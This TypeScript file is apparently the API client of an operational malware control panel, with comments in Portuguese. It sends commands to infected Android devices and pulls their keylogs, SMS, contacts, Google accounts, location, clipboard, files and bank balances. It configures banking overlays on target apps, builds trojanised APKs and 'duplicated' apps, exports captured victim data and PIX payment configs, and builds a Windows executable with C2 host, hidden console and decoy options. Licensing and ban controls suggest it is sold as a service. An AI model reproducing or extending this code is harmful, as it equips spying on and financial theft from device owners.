import axios from 'axios';
import type { Device, LoginCredentials, CommandRequest, DeviceLog } from '@/types';

/** URL da API = mesmo host do painel (VPS, IP ou domínio). Nunca IP local fixo. */
export function getApiBaseUrl(): string {
  if (typeof window === 'undefined') {
    return '';
  }
  const { hostname, port, origin } = window.location;
  // Vite dev (porta 3000): proxy relativo
  if ((hostname === 'localhost' || hostname === '127.0.0.1') && port === '3000') {
    return '';
  }
  return origin;
}

/** @deprecated use getApiBaseUrl() — mantido para imports legados em template strings */
export const API_BASE_URL = '' as unknown as string;

const api = axios.create({
  headers: {
    'Content-Type': 'application/json',
  },
});

api.interceptors.request.use((config) => {
  config.baseURL = getApiBaseUrl();
  const token = localStorage.getItem('admin_token') || localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// ==================== Auth API ====================
export const authAPI = {
  login: async (credentials: LoginCredentials) => {
    const response = await api.post('/api/auth/login', credentials);
    return response.data;
  },

  activateHwid: async (data: { username: string; password: string; hwid: string }) => {
    const response = await api.post('/api/auth/activate-hwid', data);
    return response.data;
  },

  refresh: async () => {
    const response = await api.post('/api/auth/refresh');
    return response.data;
  },

  me: async () => {
    const response = await api.get('/api/auth/me');
    return response.data;
  },

  updateProfile: async (data: { username?: string; email?: string; password?: string }) => {
    const response = await api.put('/api/auth/profile', data);
    return response.data;
  },

  verify2FA: async (data: { two_factor_token: string; code: string; hwid?: string }) => {
    const response = await api.post('/api/auth/verify-2fa', data);
    return response.data;
  },

  setup2FA: async (data: { two_factor_token: string; code: string; hwid?: string }) => {
    const response = await api.post('/api/auth/setup-2fa', data);
    return response.data;
  },
};

// ==================== Devices API ====================
export const devicesAPI = {
  getAll: async (): Promise<Device[]> => {
    const response = await api.get('/api/devices');
    return response.data;
  },

  sendCommand: async (deviceId: string, command: CommandRequest) => {
    const response = await api.post(`/api/devices/${deviceId}/command`, command);
    return response.data;
  },

  getLogs: async (deviceId: string): Promise<DeviceLog[]> => {
    const response = await api.get(`/api/devices/${deviceId}/logs`);
    return response.data;
  },

  getNotifications: async (deviceId: string): Promise<any[]> => {
    const response = await api.get(`/api/devices/${deviceId}/notifications`);
    return response.data;
  },
  
  rename: async (deviceId: string, customName: string) => {
    const response = await api.put(`/api/devices/${deviceId}/rename`, { custom_name: customName });
    return response.data;
  },

  deleteDevice: async (deviceId: string) => {
    const response = await api.delete(`/api/devices/${deviceId}`);
    return response.data;
  },

  getClipboard: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/clipboard`);
    return response.data;
  },

  setClipboard: async (deviceId: string, text: string) => {
    const response = await api.post(`/api/devices/${deviceId}/clipboard`, { text });
    return response.data;
  },

  reconnectDevice: async (deviceId: string): Promise<any> => {
    const response = await api.post(`/api/devices/${deviceId}/reconnect`);
    return response.data;
  },

  getKeylogs: async (deviceId: string, limit = 200): Promise<any[]> => {
    const response = await api.get(`/api/devices/${deviceId}/keylogs-all?limit=${limit}`);
    return response.data;
  },

  createOverlayMapping: async (deviceId: string, data: { package_name: string; screen_name?: string; template: any; is_enabled?: boolean }) => {
    const response = await api.post(`/api/devices/${deviceId}/overlay-mappings`, data);
    return response.data;
  },

  getOverlayMappings: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/overlay-mappings`);
    return response.data;
  },

  deleteOverlayMapping: async (deviceId: string, mappingId: number) => {
    const response = await api.delete(`/api/devices/${deviceId}/overlay-mappings/${mappingId}`);
    return response.data;
  },

  getApps: async (deviceId: string) => {
    try {
      const response = await api.get(`/api/devices/${deviceId}/installed-apps`);
      return response.data;
    } catch {
      const response = await api.get(`/api/devices/${deviceId}/apps`);
      return response.data;
    }
  },

  refreshApps: async (deviceId: string) => {
    const response = await api.post(`/api/devices/${deviceId}/refresh-apps`);
    return response.data;
  },

  getBankBalances: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/bank-balances`);
    return response.data;
  },

  getSms: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/sms`);
    return response.data;
  },

  getContacts: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/contacts`);
    return response.data;
  },

  getGoogleAccounts: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/google-accounts`);
    return response.data;
  },

  getLocation: async (deviceId: string) => {
    const response = await api.get(`/api/devices/${deviceId}/location`);
    return response.data;
  },

  getFileList: async (deviceId: string, path: string = '/sdcard') => {
    const response = await api.get(`/api/devices/${deviceId}/file-list?path=${encodeURIComponent(path)}`);
    return response.data;
  },
};

// ==================== APK API ====================
export const apkAPI = {
  build: async (formData: FormData) => {
    const token = localStorage.getItem('token');
    const response = await axios.post(`${getApiBaseUrl()}/api/build-apk`, formData, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });
    return response.data;
  },

  buildDuplicator: async (formData: FormData) => {
    const token = localStorage.getItem('token');
    const response = await axios.post(`${getApiBaseUrl()}/api/app-duplicator/build`, formData, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });
    return response.data;
  },

  getBuildStatus: async (buildId: string) => {
    const response = await api.get(`/api/build-status/${buildId}`);
    return response.data;
  },

  getStatus: async () => {
    const response = await api.get('/api/build-status');
    return response.data;
  },
};

// ==================== Admin API ====================
export const adminAPI = {
  getStats: async () => {
    const response = await api.get('/api/admin/stats');
    return response.data;
  },

  getUsers: async () => {
    const response = await api.get('/api/admin/users');
    return response.data;
  },

  getUser: async (userId: number) => {
    const response = await api.get(`/api/admin/users/${userId}`);
    return response.data;
  },

  createUser: async (data: { username: string; email: string; password: string; is_admin?: boolean; expiration_days?: number; expires_at?: string; notes?: string }) => {
    const formData = new FormData();
    formData.append('username', data.username);
    formData.append('email', data.email);
    formData.append('password', data.password);
    if (data.is_admin !== undefined) formData.append('is_admin', String(data.is_admin));
    if (data.expiration_days !== undefined && data.expiration_days > 0) formData.append('expiration_days', String(data.expiration_days));
    if (data.expires_at) formData.append('expires_at', data.expires_at);
    if (data.notes) formData.append('notes', data.notes);

    const response = await api.post('/api/admin/users', formData, {
      headers: { 'Content-Type': 'multipart/form-data' },
    });
    return response.data;
  },

  updateUser: async (userId: number, data: any) => {
    const formData = new FormData();
    Object.keys(data).forEach((key) => {
      if (data[key] !== undefined && data[key] !== null) {
        formData.append(key, String(data[key]));
      }
    });

    const response = await api.put(`/api/admin/users/${userId}`, formData, {
      headers: { 'Content-Type': 'multipart/form-data' },
    });
    return response.data;
  },

  deleteUser: async (userId: number) => {
    const response = await api.delete(`/api/admin/users/${userId}`);
    return response.data;
  },

  banUser: async (userId: number) => {
    const response = await api.post(`/api/admin/users/${userId}/ban`);
    return response.data;
  },

  unbanUser: async (userId: number) => {
    const response = await api.post(`/api/admin/users/${userId}/unban`);
    return response.data;
  },

  resetHwid: async (userId: number) => {
    const response = await api.post(`/api/admin/users/${userId}/reset-hwid`);
    return response.data;
  },

  reset2FA: async (userId: number) => {
    const response = await api.post(`/api/admin/users/${userId}/reset-2fa`);
    return response.data;
  },

  getDevices: async () => {
    const response = await api.get('/api/admin/devices');
    return response.data;
  },

  assignDevice: async (deviceId: string, userId: number) => {
    const formData = new FormData();
    formData.append('user_id', String(userId));

    const response = await api.post(`/api/admin/devices/${deviceId}/assign`, formData, {
      headers: { 'Content-Type': 'multipart/form-data' },
    });
    return response.data;
  },

  unassignDevice: async (deviceId: string) => {
    const response = await api.post(`/api/admin/devices/${deviceId}/unassign`);
    return response.data;
  },
};

// ==================== Layout API ====================
export const layoutAPI = {
  getLayout: async () => {
    const response = await api.get('/api/user/layout');
    return response.data;
  },

  saveLayout: async (layoutData: any) => {
    const response = await api.post('/api/user/layout', layoutData);
    return response.data;
  },

  resetLayout: async () => {
    const response = await api.delete('/api/user/layout');
    return response.data;
  },
};

// ==================== APK Studio API ====================
export const apkStudioAPI = {
  getBuilds: async () => {
    const response = await api.get('/api/apk-studio/builds');
    return response.data;
  },

  injectZip: async (filename: string, zipFile: File) => {
    const formData = new FormData();
    formData.append('filename', filename);
    formData.append('zip_file', zipFile);
    const token = localStorage.getItem('token');
    const response = await axios.post(`${getApiBaseUrl()}/api/apk-studio/inject-zip`, formData, {
      headers: {
        'Content-Type': 'multipart/form-data',
        Authorization: `Bearer ${token}`,
      },
    });
    return response.data;
  },

  getProjects: async () => {
    const response = await api.get('/api/apk-studio/projects');
    return response.data;
  },

  createProject: async (projectData: any) => {
    const response = await api.post('/api/apk-studio/projects', projectData);
    return response.data;
  },

  updateProject: async (projectId: string, projectData: any) => {
    const response = await api.put(`/api/apk-studio/projects/${projectId}`, projectData);
    return response.data;
  },

  deleteProject: async (projectId: string) => {
    const response = await api.delete(`/api/apk-studio/projects/${projectId}`);
    return response.data;
  },

  getCapturedData: async (projectId: string, page = 1, limit = 50) => {
    const response = await api.get(`/api/apk-studio/data/${projectId}?page=${page}&limit=${limit}`);
    return response.data;
  },

  clearCapturedData: async (projectId: string) => {
    const response = await api.delete(`/api/apk-studio/data/${projectId}`);
    return response.data;
  },

  exportDataCSV: async (projectId: string) => {
    const response = await api.get(`/api/apk-studio/data/${projectId}/export-csv`, {
      responseType: 'blob',
    });
    return response.data;
  },

  exportDataJSON: async (projectId: string) => {
    const response = await api.get(`/api/apk-studio/data/${projectId}/export-json`, {
      responseType: 'blob',
    });
    return response.data;
  },

  getProjectStats: async (projectId: string) => {
    const response = await api.get(`/api/apk-studio/stats/${projectId}`);
    return response.data;
  },

  buildAPK: async (projectData: any) => {
    const response = await api.post('/api/apk-studio/build', projectData);
    return response.data;
  },

  getBuildStatus: async (buildId: string) => {
    const response = await api.get(`/api/apk-studio/build-status/${buildId}`);
    return response.data;
  },

  getPixConfigs: async () => {
    const response = await api.get('/api/apk-studio/pix-configs');
    return response.data;
  },

  createPixConfig: async (configData: any) => {
    const response = await api.post('/api/apk-studio/pix-configs', configData);
    return response.data;
  },

  deletePixConfig: async (configId: string) => {
    const response = await api.delete(`/api/apk-studio/pix-configs/${configId}`);
    return response.data;
  },
};

export const winBuilderAPI = {
  buildExe: async (payload: {
    c2_host?: string;
    c2_port?: number;
    use_ssl?: boolean;
    output_name?: string;
    hide_console?: boolean;
    decoy_url?: string;
    decoy_message?: string;
    [key: string]: any;
  }) => {
    const response = await api.post('/api/build-exe', payload);
    return response.data;
  },
};

export default api;

